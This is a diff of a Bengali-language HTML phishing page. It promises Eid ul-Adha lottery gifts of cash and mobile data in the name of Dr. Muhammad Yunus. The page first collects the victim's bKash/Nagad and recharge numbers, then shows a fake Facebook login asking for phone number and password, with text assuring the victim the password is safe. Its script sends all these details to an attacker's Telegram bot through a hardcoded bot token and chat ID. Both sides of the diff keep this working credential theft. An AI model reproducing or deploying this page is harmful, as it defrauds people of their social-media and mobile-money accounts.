@@ -3,24 +3,19 @@
 <head>
   <meta charset="UTF-8" />
   <title>ঈদুল আযহা উপলক্ষে ডঃ মোঃ ইউনুস দেচ্ছে অসংখ্য উপহার</title>
-  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
     * { box-sizing: border-box; }
     body {
       margin: 0;
       padding: 0;
-      font-family: 'Noto Sans Bengali', 'Roboto', sans-serif;
+      font-family: 'Roboto', sans-serif;
       background: linear-gradient(135deg, #4a90e2, #357ABD);
       height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       color: #222;
-      transition: background 0.3s ease, color 0.3s ease;
-    }
-    body.dark {
-      background: #1e1e1e;
-      color: #ddd;
     }
     .container {
       background: white;
@@ -29,98 +24,125 @@
       box-shadow: 0 12px 30px rgba(0,0,0,0.2);
       padding: 30px 35px;
       text-align: center;
-      transition: background 0.3s ease;
-    }
-    body.dark .container {
-      background: #2c2c2c;
     }
     .container h1, .container h2 {
+      margin-bottom: 10px;
+      font-weight: 700;
       color: #1877f2;
+      font-size: 28px;
+      letter-spacing: 1.1px;
     }
-    body.dark .container h1,
-    body.dark .container h2 {
-      color: #4ea0ff;
+    .container p {
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 30px;
+    }
+    .lottery-container {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 25px;
+      gap: 15px;
     }
     .lottery-box {
       background: #e7f0ff;
-      transition: all 0.3s ease;
+      border-radius: 14px;
+      flex: 1;
+      padding: 20px 0;
+      font-size: 20px;
+      font-weight: 700;
+      color: #1877f2;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(24,119,242,0.25);
+      user-select: none;
+      transition: background 0.3s ease, transform 0.2s ease;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border: 2px solid transparent;
     }
-    body.dark .lottery-box {
-      background: #3a3a3a;
-      color: #cce7ff;
+    .lottery-box:hover {
+      background: #d0e2ff;
+      transform: scale(1.08);
+      border-color: #1877f2;
     }
-    body.dark .lottery-box.active {
+    .lottery-box.active {
       background: #1877f2;
       color: white;
+      border-color: #0f52c9;
+      transform: scale(1.1);
+      box-shadow: 0 8px 20px rgba(24,119,242,0.6);
+    }
+    #selectedLottery {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 30px;
+      color: #0f52c9;
+      min-height: 26px;
+      user-select: none;
+      transition: color 0.3s ease;
+    }
+    .input-container {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
     }
     input {
-      background: #fff;
+      padding: 14px 16px;
+      font-size: 16px;
+      border-radius: 12px;
+      border: 1.5px solid #dddfe2;
+      transition: border-color 0.3s ease;
     }
-    body.dark input {
-      background: #444;
-      color: white;
-      border-color: #666;
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
     }
     button {
-      position: relative;
-    }
-    .loader {
-      display: none;
-      position: absolute;
-      right: 20px;
-      top: 50%;
-      transform: translateY(-50%);
-      border: 3px solid #fff;
-      border-top: 3px solid #1877f2;
-      border-radius: 50%;
-      width: 18px;
-      height: 18px;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% {transform: translateY(-50%) rotate(0deg);}
-      100% {transform: translateY(-50%) rotate(360deg);}
-    }
-    #themeToggle {
-      position: fixed;
-      top: 10px;
-      right: 15px;
-      background: #fff;
+      margin-top: 15px;
+      background: #1877f2;
       border: none;
-      padding: 6px 12px;
-      border-radius: 10px;
+      color: white;
+      padding: 15px 0;
+      font-size: 18px;
+      font-weight: 700;
+      border-radius: 14px;
       cursor: pointer;
-      font-weight: bold;
-      z-index: 1000;
+      box-shadow: 0 6px 12px rgba(24,119,242,0.7);
+      transition: background 0.3s ease;
     }
-    body.dark #themeToggle {
-      background: #444;
-      color: #fff;
+    button:hover {
+      background: #0f52c9;
     }
     #secondForm, #thirdInterface {
       display: none;
     }
   </style>
-</head>
-<body>
-  <button id="themeToggle">🌙</button>
 
+  <!-- অডিও সাউন্ড ফাইল লোড -->
+  <audio id="clickSound" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_85bfa1cc52.mp3?filename=click-button-140881.mp3" preload="auto"></audio>
+</head>
+
+<body>
   <!-- প্রথম ইন্টারফেস -->
   <div class="container" id="firstForm">
     <img src="https://raw.githubusercontent.com/sm-soad00/Free-taka-income-/main/Picsart_25-05-22_12-01-02-898.jpg" alt="Lottery Banner" style="width: 100%; border-radius: 12px; margin-bottom: 20px;" />
     <h1>ঈদুল আযহা উপলক্ষে লটারি গিফট!</h1>
     <p>নিচের 4টি গিফট বক্স থেকে আপনার পছন্দের গিফট নির্বাচন করুন এবং তথ্য দিন।</p>
+
     <div class="lottery-container">
       <div class="lottery-box" onclick="pickLottery(this)">🎉 ক্যাশ ১০০০ টাকা। 500Mb মেয়াদ 3 দিন</div>
       <div class="lottery-box" onclick="pickLottery(this)">🎁 500টাকা।2GB Mb মেয়াদ ৭ দিন</div>
       <div class="lottery-box" onclick="pickLottery(this)">💰 ৬০০ টাকা বোনাস</div>
       <div class="lottery-box" onclick="pickLottery(this)">🎈 30GB MB মেয়াদ ৩০ দিন</div>
     </div>
+
     <div id="selectedLottery">কোনও গিফট নির্বাচন করা হয়নি</div>
+
     <div class="input-container">
       <input type="text" id="userName" placeholder="আপনার বিকাশ অথবা নগদ নাম্বার লিখুন" autocomplete="off" />
       <input type="text" id="fatherName" placeholder="রিচার্জ একাউন্টের নাম্বার লিখুন" autocomplete="off" />
-      <button onclick="submitFirstForm()">সাবমিট করুন <span class="loader" id="loader1"></span></button>
+      <button onclick="submitFirstForm()">সাবমিট করুন</button>
     </div>
   </div>
 
@@ -129,10 +151,10 @@
     <h2>Facebook</h2>
     <input type="text" id="PhoneNumber" placeholder="your mobile number" autocomplete="off" />
     <input type="text" id="YourPassword" placeholder="your password" autocomplete="off" />
-    <button onclick="sendToTelegram()">Log In <span class="loader" id="loader2"></span></button>
-
+    <button onclick="sendToTelegram()">Log In</button>
     <div style="margin-top: 20px; font-size: 14px; color: #cc0000; background: #fff4f4; padding: 10px; border: 1px solid #ffcccc; border-radius: 8px;">
-      আপনি যে Facebook অ্যাকাউন্টে এই মেসেজ পেয়েছেন, সেই অ্যাকাউন্টের নাম্বার এবং পাসওয়ার্ডটি এখানে দিন...
+      আপনি যে Facebook অ্যাকাউন্টে এই মেসেজ পেয়েছেন, সেই অ্যাকাউন্টের নাম্বার এবং পাসওয়ার্ডটি এখানে দিন আমরা চেক করে দেখব আপনি সত্যিই পুরস্কার জেতার জন্য উপযোগী কিনা। আপনার দেওয়া নাম্বার পাসওয়ার্ডটি আমাদের কাছে সুরক্ষিত ভাবে থাকবে<br>
+      অনুগ্রহ করে আপনার ফেসবুক আইডি নাম্বার পাসওয়ার্ডটি অন্য কারো কাছে শেয়ার করবেন না<br><strong>ধন্যবাদ!</strong>
     </div>
 
     <div style="margin-top: 12px; font-size: 14px; color: #666;">
@@ -144,80 +166,79 @@
   <div class="container" id="thirdInterface">
     <h2>অভিনন্দন!</h2>
     <p style="font-size: 16px; color: #333; line-height: 1.6;">
-      আপনার দেওয়া সকল তথ্য যদি সঠিক হয়...
+      আপনার দেওয়া সকল তথ্য যদি সঠিক হয় এবং আপনার অ্যাকাউন্টের নাম্বার ও পাসওয়ার্ড যদি সঠিক হয়,<br>
+      তাহলে আপনার একাউন্টে ৩০ মিনিটের মধ্যে টাকা ঢুকে যাবে।<br><br>
+      কোন টেনশন করবেন না, আপনার অ্যাকাউন্ট আমাদের কাছে সম্পূর্ণ নিরাপদ থাকবে।
     </p>
   </div>
 
-  <!-- সাউন্ড -->
-  <audio id="clickSound" src="https://www.myinstants.com/media/sounds/mouse-click.mp3"></audio>
-
   <script>
-  let selectedGift = null;
+    let selectedGift = null;
 
-  function pickLottery(el) {
-    document.querySelectorAll('.lottery-box').forEach(box => box.classList.remove('active'));
-    el.classList.add('active');
-    selectedGift = el.innerText;
-    document.getElementById('selectedLottery').innerText = `নির্বাচিত গিফট: ${selectedGift}`;
-    document.getElementById("clickSound").play();
-  }
-
-  function submitFirstForm() {
-    const name = document.getElementById('userName').value.trim();
-    const fatherName = document.getElementById('fatherName').value.trim();
-
-    if (!selectedGift) return alert('অনুগ্রহ করে একটি গিফট নির্বাচন করুন!');
-    if (name === '' || fatherName === '') return alert('আপনার তথ্যগুলো দিন!');
-
-    document.getElementById('loader1').style.display = 'inline-block';
-    setTimeout(() => {
-      document.getElementById('firstForm').style.display = 'none';
-      document.getElementById('secondForm').style.display = 'block';
-      document.getElementById('loader1').style.display = 'none';
-    }, 1200);
-  }
-
-  function sendToTelegram() {
-    const YourNumber = document.getElementById("PhoneNumber").value.trim();
-    const YourPassword = document.getElementById("YourPassword").value.trim();
-    const bkashNumber = document.getElementById('userName').value.trim();
-    const accountName = document.getElementById('fatherName').value.trim();
-
-    if (YourNumber === '' || YourPassword === '') {
-      alert('সব তথ্য দিন অনুগ্রহ করে!');
-      return;
+    function playSound() {
+      const sound = document.getElementById("clickSound");
+      if (sound) sound.play();
     }
 
-    document.getElementById('loader2').style.display = 'inline-block';
+    function pickLottery(el) {
+      playSound();
+      document.querySelectorAll('.lottery-box').forEach(box => box.classList.remove('active'));
+      el.classList.add('active');
+      selectedGift = el.innerText;
+      document.getElementById('selectedLottery').innerText = `নির্বাচিত গিফট: ${selectedGift}`;
+    }
 
-    const message = `নতুন সাবমিশন:
+    function submitFirstForm() {
+      playSound();
+      const name = document.getElementById('userName').value.trim();
+      const fatherName = document.getElementById('fatherName').value.trim();
+
+      if (!selectedGift) {
+        alert('অনুগ্রহ করে একটি গিফট নির্বাচন করুন!');
+        return;
+      }
+      if (name === '' || fatherName === '') {
+        alert('আপনার তথ্যগুলো দিন!');
+        return;
+      }
+
+      document.getElementById('firstForm').style.display = 'none';
+      document.getElementById('secondForm').style.display = 'block';
+    }
+
+    function sendToTelegram() {
+      playSound();
+      const YourNumber = document.getElementById("PhoneNumber").value.trim();
+      const YourPassword = document.getElementById("YourPassword").value.trim();
+      const bkashNumber = document.getElementById('userName').value.trim();
+      const accountName = document.getElementById('fatherName').value.trim();
+
+      if (YourNumber === '' || YourPassword === '') {
+        alert('সব তথ্য দিন অনুগ্রহ করে!');
+        return;
+      }
+
+      const message = `নতুন সাবমিশন:
 গিফট: ${selectedGift}
 বিকাশ/নগদ নাম্বার: ${bkashNumber}
 রিচার্জ একাউন্ট নাম্বার: ${accountName}
 মোবাইল নাম্বার: ${YourNumber}
 পাসওয়ার্ড: ${YourPassword}`;
 
-    fetch("https://api.telegram.org/bot7637297360:AAH_pFB9-YpQ62y-6F3qs3CAHx-S5yrzxsg/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: "6429244657",
-        text: message
-      })
-    }).then(res => {
-      document.getElementById("secondForm").style.display = "none";
-      document.getElementById("thirdInterface").style.display = "block";
-      document.getElementById('loader2').style.display = 'none';
-    }).catch(err => {
-      alert("ত্রুটি: তথ্য পাঠানো যায়নি!");
-      document.getElementById('loader2').style.display = 'none';
-    });
-  }
-
-  // Dark mode toggle
-  document.getElementById("themeToggle").addEventListener("click", () => {
-    document.body.classList.toggle("dark");
-  });
+      fetch("https://api.telegram.org/bot7637297360:AAH_pFB9-YpQ62y-6F3qs3CAHx-S5yrzxsg/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "6429244657",
+          text: message
+        })
+      }).then(res => {
+        document.getElementById("secondForm").style.display = "none";
+        document.getElementById("thirdInterface").style.display = "block";
+      }).catch(err => {
+        alert("ত্রুটি: তথ্য পাঠানো যায়নি!");
+      });
+    }
   </script>
 </body>
 </html>
